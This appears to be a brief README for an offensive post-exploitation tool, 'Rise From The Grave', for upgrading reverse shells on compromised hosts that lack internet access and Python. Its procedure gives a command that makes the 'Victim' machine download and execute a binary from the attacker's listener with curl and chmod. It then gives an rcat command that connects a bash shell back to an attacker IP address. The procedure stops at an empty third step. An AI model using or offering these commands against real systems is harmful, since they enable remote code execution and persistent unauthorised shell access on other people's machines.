# RISE FROM THE GRAVE 

THis tool is for when you have established a reverse shell to a host BUT the host has no connection to the outside internet AND doesn't have python. Revive those dead shells 



Procedure


1. Host RFTG will start listening and issue the command to run on the Victim machine ex ``curl -O http://0.0.0.0:6969/rftg & chmod +x rftg && rftg``
2. Run the command on the Established Reverse shell and note the output ``rcat connect -s bash 192.168.1.10 6969``
3. 